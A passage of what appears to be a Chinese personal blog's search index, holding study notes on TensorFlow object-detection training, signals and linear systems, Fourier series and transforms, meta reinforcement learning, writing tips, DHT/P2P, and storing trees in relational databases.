num_epochs: 1</span><br><span class="line">  num_readers: 1</span><br><span class="line">  tf_record_input_reader &#123;</span><br><span class="line">    input_path: &quot;object_detection&#x2F;data&#x2F;geometry_test.record&quot;</span><br><span class="line">  &#125;</span><br><span class="line">  sample_1_of_n_examples: 1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="训练数据"><a href="#训练数据" class="headerlink" title="训练数据"></a>训练数据</h2>在GPU上训练TFModel，与在CPU上训练TFModel相比，要快五倍左右，因此推荐在GPU上训练TFModel。</li>
</ul>
<ol>
<li>启动docker<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 启动docker，并使用-v参数将目录&#x2F;home&#x2F;$USER挂载到容器上</span><br><span class="line">docker run --runtime&#x3D;nvidia -v &#x2F;home&#x2F;$USER:&#x2F;home&#x2F;$USER -it tensorflow&#x2F;tensorflow:latest-gpu-py3 bash</span><br></pre></td></tr></table></figure></li>
<li>执行训练<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># From tensorflow&#x2F;models&#x2F;research&#x2F;</span><br><span class="line">export PYTHONPATH&#x3D;$PYTHONPATH:&#96;pwd&#96;:&#96;pwd&#96;&#x2F;slim</span><br><span class="line"># 开始训练</span><br><span class="line">python object_detection&#x2F;model_main.py --pipeline_config_path&#x3D;object_detection&#x2F;ssd_mobilenet_v1_coco_2018_01_28&#x2F;pipeline.config --model_dir&#x3D;object_detection&#x2F;ssd_mobilenet_v1_coco_2018_01_28&#x2F;saved_model&#x2F; --num_train_steps&#x3D;50000 --alsologtostderr</span><br></pre></td></tr></table></figure></li>
<li>使用tensorboard查看训练进度<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># From tensorflow&#x2F;models&#x2F;research&#x2F;</span><br><span class="line">tensorboard --logdir&#x3D;object_detection&#x2F;ssd_mobilenet_v1_coco_2018_01_28&#x2F;saved_model&#x2F;</span><br></pre></td></tr></table></figure>
在CPU上训练只需执行第二步和第三步。</li>
</ol>
<h2 id="导出模型"><a href="#导出模型" class="headerlink" title="导出模型"></a>导出模型</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># From tensorflow&#x2F;models&#x2F;research&#x2F;</span><br><span class="line">python object_detection&#x2F;export_inference_graph.py --input_type&#x3D;image_tensor --pipeline_config_path&#x3D;object_detection&#x2F;ssd_mobilenet_v1_coco_2018_01_28&#x2F;pipeline.config --trained_checkpoint_prefix&#x3D;object_detection&#x2F;ssd_mobilenet_v1_coco_2018_01_28&#x2F;saved_model&#x2F;model.ckpt-50000 --output_directory&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ssd_mobilenet_v1_coco_2018_01_28</span><br></pre></td></tr></table></figure>
<p>运行完命令后模型就导出到 ssd_mobilenet_v1_coco_2018_01_28 文件夹中，其中的frozen_inference_graph.pb即是所需模型。 需要注意的是，参数中的 –trained_checkpoint_prefix 是需要指定到单个模型的，例如 model.ckpt-50000，这个50000就是训练了 50000 步后自动保存模型。</p>
<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><ol>
<li><a href="https://huangwang.github.io/2018/10/18/Debian-Linux下安装Docker的方法/，">https://huangwang.github.io/2018/10/18/Debian-Linux下安装Docker的方法/，</a> by jack huang</li>
<li><a href="https://www.tensorflow.org/install/docker?hl=zh-cn" target="_blank" rel="noopener">https://www.tensorflow.org/install/docker?hl=zh-cn</a> , by tensorflow.</li>
<li><a href="https://huangwang.github.io/2018/10/09/Virtualenv简易教程/">https://huangwang.github.io/2018/10/09/Virtualenv简易教程/</a> , by jack huang</li>
<li><a href="https://laddiexu.github.io/tech/2017/11/04/TF-ODYourData.html" target="_blank" rel="noopener">https://laddiexu.github.io/tech/2017/11/04/TF-ODYourData.html</a> , by 菁菁者莪</li>
<li><a href="https://blog.csdn.net/xunan003/article/details/78720189?utm_source=blogxgwz2" target="_blank" rel="noopener">https://blog.csdn.net/xunan003/article/details/78720189?utm_source=blogxgwz2</a>, by xunan003</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>tensorflow</tag>
      </tags>
  </entry>
  <entry>
    <title>信号与线性系统学习笔记</title>
    <url>/2019/07/05/%E4%BF%A1%E5%8F%B7%E4%B8%8E%E7%BA%BF%E6%80%A7%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>信号与线性系统是学习自动控制理论的前置专业基础课，可惜当年就学得似懂非懂，过了这么多年，知识早就忘了，现在捡起来温习一下，算是温故而知新吧。</p>
<h1 id="信号与系统基础"><a href="#信号与系统基础" class="headerlink" title="信号与系统基础"></a>信号与系统基础</h1><p>连续的或离散的动态系统，按其基本特性可分为线性的与非线性的；时变的与时不变的；因果的与非因果的；稳定与非稳定的。</p>
<h1 id="连续系统的时域分析"><a href="#连续系统的时域分析" class="headerlink" title="连续系统的时域分析"></a>连续系统的时域分析</h1><p>对单输入与单输出的线性时不变连续系统，通常适用n阶常系数线性微分方程表示：</p>
<p>$$y^{(n)}(t)+a_{n-1}y^{(n-1)}(t)+…+a_1y^{(1)}(t)+a_0y(t) \<br>=b_mf^{(m)}(t)+b_{m-1}f^{(m-1)}(t)+…+b_1f^{(1)}(t)+b_0f(t) \tag{1}$$</p>
<p>或缩写为</p>
<p>$$\sum_{i=0}^{n}a_iy^{(i)}(t)=\sum_{j=0}^{m}b_jy^{(j)}(t)$$</p>
<p>其中$f(t)$为激励，$y(t)$为响应，$a_i(i=0,1,…,n)$和$b_j(j=0,1,…,n)$均为常数，$a_n=1$。</p>
<p>该微分方程的全解由齐次解$y_h(t)$和特解$y_p(t)$组成，即</p>
<p>$$y(t)=y_h(t)+y_p(t)$$</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zhuanlan.zhihu.com/p/31383909" target="_blank" rel="noopener">1. 信号与线性系统—究竟在学啥？</a>,by Dean Rossi.</li>
<li><a href="https://zhuanlan.zhihu.com/p/31921889" target="_blank" rel="noopener">2. 信号与线性系统——信号的分解</a>,by Dean Rossi.</li>
<li><a href="https://zhuanlan.zhihu.com/p/32205610" target="_blank" rel="noopener">3. 信号与线性系统——啥？卷积？</a>,by Dean Rossi.</li>
<li><a href="https://zhuanlan.zhihu.com/p/32963217" target="_blank" rel="noopener">4. 信号与线性系统——你好，傅里叶</a>,by Dean Rossi.</li>
<li><a href="https://zhuanlan.zhihu.com/p/33291443" target="_blank" rel="noopener">5. 信号与线性系统——F.T&amp;L.T</a>,by Dean Rossi.</li>
<li><a href="https://zhuanlan.zhihu.com/p/35533240" target="_blank" rel="noopener">7. 信号与线性系统——系统的分析方法</a>,by Dean Rossi.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>控制理论</tag>
      </tags>
  </entry>
  <entry>
    <title>傅里叶级数和变换学习笔记</title>
    <url>/2019/07/01/%E5%82%85%E9%87%8C%E5%8F%B6%E7%BA%A7%E6%95%B0%E5%92%8C%E5%8F%98%E6%8D%A2%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>在数学中，<strong>傅里叶级数（Fourier series）</strong>能将任何周期函数或周期信号分解成一个（可能由无穷个元素组成的）简单振荡函数的集合，即正弦函数和余弦函数（或者，等价地使用复指数）。<strong>傅里叶变换（Fourier transform）</strong>是一种线性积分变换，用于信号在时域（或空域）和频域之间的变换，在物理学和工程学中有许多应用。傅里叶变换就像化学分析，确定物质的基本成分；信号来自自然界，也可对其进行分析，确定其基本成分。</p>
<h1 id="傅里叶级数公式"><a href="#傅里叶级数公式" class="headerlink" title="傅里叶级数公式"></a>傅里叶级数公式</h1><p>傅里叶级数的公式：</p>
<p>$$<br>f(t) =\frac{a_{0}}{2}+a_{1}cos(\omega t)+b_{1}sin(\omega t) \<br>+a_{2}cos(2\omega t)+b_{2}sin(2\omega t) +…\<br>=\frac{a_{0}}{2}+\sum_{n=1}^{\infty}{[a_{n}cos(n\omega t)+b_{n}sin(n\omega t)]}  \tag{1}<br>$$</p>
<p>其中：<br>$$<br>a_{n}=\frac{2}{T}\int_{t_{0}}^{t_{0}+T}f(t)cos(n\omega t)dt \tag{2}<br>$$<br>$$<br>b_{n}=\frac{2}{T}\int_{t_{0}}^{t_{0}+T}f(t)sin(n\omega t)dt \tag{3}<br>$$</p>
<h1 id="傅里叶级数的收敛性"><a href="#傅里叶级数的收敛性" class="headerlink" title="傅里叶级数的收敛性"></a>傅里叶级数的收敛性</h1><p>若傅里叶级数不收敛于$f(t)$，则不能在两者之间画等号。关于傅里叶级数的收敛性，最常用的为狄利克雷条件：</p>
<blockquote>
<p>对于一个周期为$2\pi$的函数$f(x)$，如果它满足：</p>
</blockquote>
<blockquote>
<p>（1）在一个周期内连续或只有有限个第一类间断点；</p>
</blockquote>
<blockquote>
<p>（2）在一个周期内只有有限个极值点。</p>
</blockquote>
<blockquote>
<p>那么$f(x)$的傅里叶级数收敛于$\frac{f(x+0)+f(x-0)}{2}$。</p>
</blockquote>
<p>狄利克雷条件只是傅里叶级数收敛的充分条件，而非必要条件，级数收敛不代表该条件成立。</p>
<p>下面给出一个周期函数的傅里叶级数的计算示例。</p>
<p>周期为$2\pi$的函数$f(x)$，在$(-\pi,\pi)$上$f(x)=x$，求$f(x)$的傅里叶级数。</p>
<p>$$a_n=\frac{1}{\pi}\int_{-\pi}^{\pi}x\mathrm{cos}nx\mathrm{d}x=0$$</p>
<p>$$b_n=\frac{1}{\pi}\int_{-\pi}^{\pi}x\mathrm{sin}nx\mathrm{d}x=(-1)^{n+1}\frac{2}{n}$$</p>
<p>狄利克雷条件显然成立，所以</p>
<p>$$f(x)=\sum^{\infty}_{n=1}(-1)^{n+1}\frac{2}{n}\mathrm{sin}nx$$</p>
<h1 id="傅里叶级数的指数形式"><a href="#傅里叶级数的指数形式" class="headerlink" title="傅里叶级数的指数形式"></a>傅里叶级数的指数形式</h1><p>令$i$表示虚数单位，傅里叶级数的指数形式为:</p>
<p>$$f(t)=\sum^{\infty}_{n=-\infty}c_ne^{in\omega t}$$</p>
<p>其中,</p>
<p>$$c_n=\frac{1}{T}\int^{T}_{0}f(t)e^{-in\omega t}\mathrm{d}t$$</p>
<p>指数形式与三角形式是相等的，推导如下:</p>
<p>$$\begin{aligned}<br>&amp;\quad\sum^{\infty}<em>{n=-\infty}c_ne^{in\omega t}\<br>&amp;=c_0+\sum^{\infty}</em>{n=1}(c_ne^{in\omega t}+c_{-n}e^{-in\omega t}） \<br>&amp;=c_0+\sum^{\infty}<em>{n=1}[(c_n+c</em>{-n})\mathrm{cos}n\omega t+i(c_n-c_{-n})\mathrm{sin}n\omega t] \<br>&amp;=\frac{a_0}{2}+\sum_{n=1}^{\infty}(a_n \mathrm{cos}n \omega t+b_n \mathrm{sin}n \omega t)<br>\end{aligned}<br>$$</p>
<h1 id="傅里叶变换"><a href="#傅里叶变换" class="headerlink" title="傅里叶变换"></a>傅里叶变换</h1><p>傅里叶变换是傅里叶级数在非周期函数上的推广。对非周期函数$f(x)$，其周期$T\rightarrow\infty$。因为$\omega_0=\frac{2\pi}{T}$，则$\omega_0\rightarrow0$。</p>
<p>观察傅里叶级数的指数形式</p>
<p>$$f(t)=\sum^{\infty}_{n=-\infty}c_ne^{in\omega t} \tag{1}$$</p>
<p>其中,</p>
<p>$$c_n=\frac{1}{T}\int^{T}_{0}f(t)e^{-in\omega t}\mathrm{d}t \tag{2}$$</p>
<p>当 $\omega_0\rightarrow0$ 时， $n\omega_0$ 从原本的离散变化变成了连续变化， $c_n$ 也就可以表示为关于 $n\omega_0$ 的函数 $F(n\omega_0)$ 。</p>
<p>傅里叶级数中公式（2）的积分的上下限不一定是$0$到$T$，只需要$f(t)$的一个周期就可以了。即对于任意的$x_0$, 公式(2)可表示为：</p>
<p>$$c_n=\frac{1}{T}\int^{x_0+T}_{x_0}f(t)e^{-in\omega_0 t}\mathrm{d}t \tag{3}$$</p>
<p>这个积分需要积一整个周期，而此时的周期为无穷大，也就是整个定义域上都需要积，所以要从$-\infty$积分到$\infty$。</p>
<p>只需要让上式中的 $T\rightarrow\infty$ ， $\omega_0\rightarrow0$ ，便可以得到 $F(n\omega_0)$ 的表达式。不妨令 $\omega=n\omega_0$ ，就得到了 </p>
<p>$$F(\omega)=\frac{1}{T}\int^{\infty}_{-\infty}f(t)e^{-i\omega t}\mathrm{d}t \tag{4}$$ </p>
<p>由于$\frac{1}{T}\rightarrow0$，我们先丢弃$\frac{1}{T}$，之后用到$F(\omega)$在乘回来，于是令：</p>
<p>$$F(\omega)=\int^{\infty}_{-\infty}f(t)e^{-i\omega t}\mathrm{d}t \tag{5}$$ </p>
<p>将公式（5）代入公式（1），并代入$\frac{1}{T}=\frac{\omega_0}{2\pi}$，则有：</p>
<p>$$f(t)=\frac{1}{2\pi}\sum^{\infty}_{n=-\infty}F(n\omega_0)e^{in\omega_0 t}\omega_0 \tag{6}$$</p>
<p>因为 $\omega=n\omega_0$ ，每次 $\omega$ 的增量 $d\omega$ 都是由于 $n$ 变为 $n+1$ 造成的，所以</p>
<p>$$\mathrm{d}\omega=(n+1)\omega_0-n\omega_0=\omega_0$$</p>
<p>同时 $n\omega_0$ 连续变化，原本的离散意义下的求和就该变为连续意义下的积分，于是公式（6）变形为：</p>
<p>$$f(t)=\frac{1}{2\pi}\int_{-\infty}^{\infty}F(\omega)e^{i\omega t}\mathrm{d}\omega \tag{7}$$</p>
<p>至此得到傅里叶变换的两个公式：</p>
<p>$$F(\omega)=ℱ[f(t)]=\int^{\infty}_{-\infty}f(t)e^{-i\omega t}\mathrm{d}t$$</p>
<p>$$f(t)=ℱ^{-1}[F(\omega)]=\frac{1}{2\pi}\int_{-\infty}^{\infty}F(\omega)e^{i\omega t}\mathrm{d}\omega$$</p>
<h1 id="傅里叶变换条件"><a href="#傅里叶变换条件" class="headerlink" title="傅里叶变换条件"></a>傅里叶变换条件</h1><p>由于傅里叶变换是从傅里叶级数推导得来的，所以还是狄利克雷条件，不过此时还要加上第三条，  $f(t)$ 在一个周期内绝对可积。</p>
<p>这一个条件在 $f(t)$ 为周期函数时，可以由前两个条件推出来，因为周期和函数值均为有限值，所以在一个周期内一定绝对可积。但是推广到傅里叶变换后，这个推导就不成立了，需要单独判定第三个条件。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zhuanlan.zhihu.com/p/19763358" target="_blank" rel="noopener">傅里叶分析之掐死教程</a>,by Heinrich.</li>
<li><a href="https://zhuanlan.zhihu.com/p/32341301" target="_blank" rel="noopener">傅里叶级数和傅里叶变换</a>,by 木不shi丁.</li>
<li><a href="https://www.zhihu.com/question/21665935" target="_blank" rel="noopener">傅里叶级数和傅里叶变换是什么关系？</a>,by 马同学.</li>
<li><a href="https://zhuanlan.zhihu.com/p/52158237" target="_blank" rel="noopener">傅里叶级数与傅里叶变换推导</a>,by 令狐哦打.</li>
<li><a href="https://zh.wikipedia.org/wiki/%E5%82%85%E9%87%8C%E5%8F%B6%E7%BA%A7%E6%95%B0" target="_blank" rel="noopener">傅里叶级数</a>,by wikipedia.</li>
<li><a href="https://zh.wikipedia.org/wiki/%E5%82%85%E9%87%8C%E5%8F%B6%E5%8F%98%E6%8D%A2" target="_blank" rel="noopener">傅里叶变换</a>,by wikipedia.</li>
<li><a href="https://zhuanlan.zhihu.com/p/41455378" target="_blank" rel="noopener">傅里叶系列（一）傅里叶级数的推导</a>,by ElPsyCongree.</li>
<li><a href="https://zhuanlan.zhihu.com/p/55566705" target="_blank" rel="noopener">傅里叶变换（一） 傅里叶级数</a>,by misaka.</li>
<li><a href="http://www.jezzamon.com/fourier/zh-cn.html" target="_blank" rel="noopener">傅里叶变换交互式入门</a>,by Jez Swanson.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>计算机视觉</tag>
      </tags>
  </entry>
  <entry>
    <title>关于疾病的思考</title>
    <url>/2020/06/05/%E5%85%B3%E4%BA%8E%E7%96%BE%E7%97%85%E7%9A%84%E6%80%9D%E8%80%83/</url>
    <content><![CDATA[<p>世界上绝大多数人不会因努力工作而致富，实现个人财务自由，但是却会因一场大病而使整个家庭陷入贫困。因此，保持健康的身体，远离疾病也是一种投资，虽不会因此致富，但却能提高我们的生活质量，减少看病支出，间接实现财富的增值。那么如何保持身体健康，远离疾病呢?</p>
<p>人会生病，主要受到三个因素的影响：</p>
<ul>
<li>先天性因素，即从娘胎里带出来的疾病。</li>
<li>接触性因素，分为环境因素和饮食因素。环境因素即人处在糟糕的环境中导致疾病。饮食因素即人摄入不健康的食物导致疾病。</li>
<li>生活性因素。人的身体像机器一样，需要爱护和保养，不正常的生活作息规律将导致疾病。</li>
</ul>
<p>先天性因素导致的疾病是无法避免的，接触性因素中的环境因素可以很好的避免，大不了换个环境，但接触性因素中的饮食因素和生活性因素就需要人的毅力去克服。保持良好的生活作息习惯和遵循健康的饮食习惯将是我们对抗疾病的主战场。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://huangwang.github.io/2020/05/23/%E5%A6%82%E4%BD%95%E8%87%B4%E5%AF%8C%E4%B8%8D%E9%9D%A0%E8%BF%90%E6%B0%94/">如何致富不靠运气</a>,by jackhuang.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>感悟</tag>
      </tags>
  </entry>
  <entry>
    <title>元强化学习研究笔记</title>
    <url>/2019/01/27/%E5%85%83%E5%BC%BA%E5%8C%96%E5%AD%A6%E4%B9%A0%E7%A0%94%E7%A9%B6%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="元强化学习定义"><a href="#元强化学习定义" class="headerlink" title="元强化学习定义"></a>元强化学习定义</h1><p>什么是元强化学习？这得从深度学习开始说起。</p>
<p>Deep Learning研究一个从x到y的映射mapping，只是这个映射函数f是用一个端到端的深度神经网络来表示。如果是计算机视觉中的图像识别，那么x就是图片，y就是标签；如果是自然语言处理中的文本翻译，那么x就是比如中文，y就是英文；如果是深度增强学习中的玩Atari游戏，那么x就是屏幕画面，y就是输出的动作。<strong>深度学习研究的就是通过深度神经网络来学习一个针对某一特定任务task的模型</strong>。通过大量的样本进行训练，训练完，这个模型就可以用在特定任务上。</p>
<p>而<strong>Meta Learning研究Task</strong>！Meta Learning的目的是希望学习很多很多的task，然后有了这些学习经验之后，在面对新的task的时候可以游刃有余，学的快又学的好！那为什么叫Meta呢？Deep Learning是在Task里面研究，现在Meta Learning是在Task外面，更高层级来研究。也就是在Meta Learning的问题上，Task是作为样本来输入的。</p>
<p>Meta RL（Meta Reinforcement Learning）是Meta Learning应用到Reinforcement Learning的一个研究方向，核心的想法就是希望AI在学习大量的RL任务中获取足够的先验知识Prior Knowledge然后在面对新的RL任务时能够 学的更快，学的更好，能够自适应新环境！</p>
<h1 id="元强化学习意义"><a href="#元强化学习意义" class="headerlink" title="元强化学习意义"></a>元强化学习意义</h1><p>元强化学习试图解决深度强化学习存在的如下问题：</p>
<ul>
<li><strong>它的样本利用率非常低</strong>。换言之为了让模型的表现达到一定高度需要极为大量的训练样本。</li>
<li><strong>最终表现很多时候不够好</strong>。在很多任务上用非强化学习甚至非学习的其它方法，如基于模型的控制（model based control），线性二次型调节器（Linear Quadratic Regulator）等等可以获得好得多的表现。最气人的是这些模型很多时候样本利用率还高。当然这些模型有的时候会有一些假设比如有训练好的模型可以模仿，比如可以进行蒙特卡洛树搜索等等。</li>
<li><strong>DRL成功的关键离不开一个好的奖励函数（reward function），然而这种奖励函数往往很难设计</strong>。在Deep Reinforcement Learning That Matters作者提到有时候把奖励乘以一个常数模型表现就会有天和地的区别。但奖励函数的坑爹之处还不止如此。奖励函数的设计需要保证：<ul>
<li>加入了合适的先验，良好的定义了问题和在一切可能状态下的对应动作。坑爹的是模型很多时候会找到作弊的手段。Alex举的一个例子是有一个任务需要把红色的乐高积木放到蓝色的乐高积木上面，奖励函数的值基于红色乐高积木底部的高度而定。结果一个模型直接把红色乐高积木翻了一个底朝天。仔啊，你咋学坏了，阿爸对你很失望啊。</li>
<li>奖励函数的值太过稀疏。换言之大部分情况下奖励函数在一个状态返回的值都是0。这就和我们人学习也需要鼓励，学太久都没什么回报就容易气馁。都说21世纪是生物的世纪，怎么我还没感觉到呢？21世纪才刚开始呢。我等不到了啊啊啊啊啊。</li>
<li>有的时候在奖励函数上下太多功夫会引入新的偏见（bias）。</li>
<li>要找到一个大家都使用而又具有好的性质的奖励函数。这里Alex没很深入地讨论，但链接了一篇陶神（Terence Tao）的博客，大家有兴趣可以去看下。</li>
</ul>
</li>
<li><strong>局部最优/探索和剥削（exploration vs. exploitation）的不当应用</strong>。Alex举的一个例子是有一个连续控制的环境里，一个类似马的四足机器人在跑步，结果模型不小心多看到了马四脚朝天一顿乱踹后结果较好的情况，于是你只能看到四脚朝天的马了。</li>
<li><strong>对环境的过拟合</strong>。DRL少有在多个环境上玩得转的。你训练好的DQN在一个Atari game上work了，换一个可能就完全不work。即便你想要做迁移学习，也没有任何保障你能成功。</li>
<li><strong>不稳定性</strong>。<ul>
<li>读DRL论文的时候会发现有时候作者们会给出一个模型表现随着尝试random seed数量下降的图，几乎所有图里模型表现最终都会降到0。相比之下在监督学习里不同的超参数或多或少都会表现出训练带来的变化，而DRL里运气不好可能很长时间你模型表现的曲线都没有任何变化，因为完全不work。</li>
<li>即便知道了超参数和随机种子，你的实现只要稍有差别，模型的表现就可以千差万别。这可能就是Deep Reinforcement Learning That Matters一文里John Schulman两篇不同文章里同一个算法在同一个任务上表现截然不同的原因。</li>
<li>即便一切都很顺利，从我个人的经验和之前同某DRL研究人员的交流来看只要时间一长你的模型表现就可能突然从很好变成完全不work。原因我不是完全确定，可能和过拟合和variance过大有关。</li>
</ul>
</li>
</ul>
<h1 id="元强化学习方法"><a href="#元强化学习方法" class="headerlink" title="元强化学习方法"></a>元强化学习方法</h1><p>Meta RL（Meta Reinforcement Learning）是Meta Learning应用到Reinforcement Learning的一个研究方向。因此元强化学习的研究借鉴了元学习的思想和方法。</p>
<h2 id="元学习方法"><a href="#元学习方法" class="headerlink" title="元学习方法"></a>元学习方法</h2><h3 id="HyperNetwork-生成参数"><a href="#HyperNetwork-生成参数" class="headerlink" title="HyperNetwork 生成参数"></a>HyperNetwork 生成参数</h3><p>HyperNetwork是一个蛮有名的网络，简单说就是用一个网络来生成另外一个网络的参数。那么我们这里非常直接，我们的设想就是希望用一个hypernetwork输入训练集数据，然后给我输出我的对应模型也就是上图f的参数，我们希望输出的这个参数能够使得在测试图片上取得好的识别效果。那么，有了这样设计，这个hypernetwork其实就是一个meta network。大家可以看到，本来基本的做法是用训练集直接训练这个模型f，但是现在我们用这个hypernetwork不训练了，直接给你输出参数，这等价于hypernetwork学会了如何学习图像识别，这也是为什么meta learning也同时叫做learning to learn的原因。我们通过hypernetwork学会学习。训练好了这个模型，连反向传播梯度下降都不要了，直接给你参数，是不是很酷？</p>
<h3 id="Conditional-Neural-Network-条件神经网络"><a href="#Conditional-Neural-Network-条件神经网络" class="headerlink" title="Conditional Neural Network 条件神经网络"></a>Conditional Neural Network 条件神经网络</h3><p>直接把D_train当做条件输入到f中，那么这个f本身就变成一个meta network了。也就是条件神经网络实际上能够得到和上面的hypernetwork一样的意义。因为我们可以想，只要条件D_train变了，那么y_test肯定也就变了。所以这里就非常非常直接了。把数据全部输入进去，让神经网络自己学就行了，不外乎就是去设计一个合适的网络结构而已。那么，这里最最简单粗暴的网络结构就是SNAIL算法使用temporal convolutional network，也就是wavenet的架构：</p>
<h3 id="MAML-基于梯度的做法"><a href="#MAML-基于梯度的做法" class="headerlink" title="MAML 基于梯度的做法"></a>MAML 基于梯度的做法</h3><p>MAML的核心步骤就是</p>
<ul>
<li><p>采集Task，得到D_train和D_test</p>
</li>
<li><p>使用D_train对神经网络f训练少数几步，得到新的参数</p>
</li>
<li><p>利用新的参数训练D_test，然后使得梯度下降更新一开始的参数。</p>
</li>
</ul>
<h3 id="三种解决办法的优缺点"><a href="#三种解决办法的优缺点" class="headerlink" title="三种解决办法的优缺点"></a>三种解决办法的优缺点</h3><p>先说HyperNetwork生成参数的做法。这种做法最大的问题就在于参数空间是很大的，所以要生成合适的参数特别是巨量的参数其实是比较困难的，所以目前绝大多数生成参数的做法都是只生成少量参数，比如一层的MLP，或者对于参数的空间进行一定的限制，比如就在[-1,1]之间，否则空间太多，有无数种选择输出一样的结果，就很难训了。但是采样HyperNetwork又有其灵活性，意味着我们可以只更新少部分参数，而不用全部。</p>
<p>接下来就是条件神经网络了。这又有什么问题呢？我觉得在性能上绝对会是最好的，很直接，但是不好看，一直要拖着一个条件，网络很大。不管是生成参数还是MAML，他们的模型网络就是独立的，之后只要输入x就行了，而条件神经网络每次都要输入条件，很烦啊。</p>
<p>那么MAML呢？可能最烦人的就是二次梯度了，这意味着MAML的训练会很慢，那么就很难hold住大网络了。实际上MAML目前对于大的网络结构比如Resnet效果并不好。然后MAML是使用D_train的Loss来更新整个网络，对比HyperNetwork缺少灵活性。这个Loss就是最好的吗？不见得。如果D_train是无监督数据，那怎么办？所以MAML是有局限性的。</p>
<p>目前各种各样的Meta Learning研究，在方法论上都逃不出这三种方法。要么改改网络结构，要么结合一下上面的方法，比如先MAML再生成参数，或者hypernetwork和conditional neural network混着用等等。那么什么才是终极必杀呢？可能还是要具体问题具体看吧，对于不同的问题采用不同办法效果会不一样。这些都值得我们去探索。</p>
<h2 id="元强化学习方法-1"><a href="#元强化学习方法-1" class="headerlink" title="元强化学习方法"></a>元强化学习方法</h2><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zhuanlan.zhihu.com/p/46059552" target="_blank" rel="noopener">Meta Learning单排小教学</a>,by Flood Sung.</li>
<li><a href="https://zhuanlan.zhihu.com/p/41223529" target="_blank" rel="noopener">最前沿: Meta RL论文解读</a>,by Flood Sung.</li>
<li><a href="https://zhuanlan.zhihu.com/p/33936457" target="_blank" rel="noopener">这里有一篇深度强化学习劝退文</a>,by Frankenstein.</li>
<li><a href="https://juejin.im/post/5ad41c826fb9a028d375ddd7" target="_blank" rel="noopener">周志华：满足这三大条件，可以考虑不用深度神经网络</a>,by 周志华教授.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title>写作技巧集锦</title>
    <url>/2022/08/13/%E5%86%99%E4%BD%9C%E6%8A%80%E5%B7%A7%E9%9B%86%E9%94%A6/</url>
    <content><![CDATA[<h1 id="删掉“我认为”、“我觉得”、“我相信”等"><a href="#删掉“我认为”、“我觉得”、“我相信”等" class="headerlink" title="删掉“我认为”、“我觉得”、“我相信”等"></a>删掉“我认为”、“我觉得”、“我相信”等</h1><h1 id="先写标题"><a href="#先写标题" class="headerlink" title="先写标题"></a>先写标题</h1><h1 id="写出音乐感"><a href="#写出音乐感" class="headerlink" title="写出音乐感"></a>写出音乐感</h1><h1 id="“triad”（三合音）"><a href="#“triad”（三合音）" class="headerlink" title="“triad”（三合音）"></a>“triad”（三合音）</h1><h1 id="CTA-call-to-action"><a href="#CTA-call-to-action" class="headerlink" title="CTA = call to action"></a>CTA = call to action</h1><h1 id="一寸相框"><a href="#一寸相框" class="headerlink" title="一寸相框"></a>一寸相框</h1><h1 id="简单和清晰"><a href="#简单和清晰" class="headerlink" title="简单和清晰"></a>简单和清晰</h1><h1 id="不说副词"><a href="#不说副词" class="headerlink" title="不说副词"></a>不说副词</h1><h1 id="填满画布"><a href="#填满画布" class="headerlink" title="填满画布"></a>填满画布</h1><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://threadreaderapp.com/thread/1554667451203276801.html" target="_blank" rel="noopener">10个实用写作技巧</a>,by happy xiao.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>科研</tag>
      </tags>
  </entry>
  <entry>
    <title>分布式哈希表DHT和P2P技术</title>
    <url>/2020/06/24/%E5%88%86%E5%B8%83%E5%BC%8F%E5%93%88%E5%B8%8C%E8%A1%A8DHT%E5%92%8CP2P%E6%8A%80%E6%9C%AF/</url>
    <content><![CDATA[<p>一篇介绍DHT和P2P技术的文章，浅显易懂，值得收藏。</p>
<p><a href="https://luyuhuang.tech/2020/03/06/dht-and-p2p.html" target="_blank" rel="noopener">分布式哈希表 (DHT) 和 P2P 技术</a></p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://luyuhuang.tech/2020/03/06/dht-and-p2p.html" target="_blank" rel="noopener">分布式哈希表 (DHT) 和 P2P 技术</a>,by Luyu Huang.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
      </tags>
  </entry>
  <entry>
    <title>关系数据库中存储树结构及前端还原的方法</title>
    <url>/2019/08/17/%E5%85%B3%E7%B3%BB%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E5%AD%98%E5%82%A8%E6%A0%91%E7%BB%93%E6%9E%84%E5%8F%8A%E5%89%8D%E7%AB%AF%E8%BF%98%E5%8E%9F%E7%9A%84%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>树形结构很常见，例如组织结构图、线性化讨论等。树形结构中，实例被称为节点（node），每个节点有多个子节点和一个父节点。最上层的节点叫根（root）节点，它没有父节点。最底层的节点叫叶（leaf）节点，它没有子节点。本文主要介绍如何在关系数据库中存储树结构，以及如何从关系数据库中恢复树结构。</p>
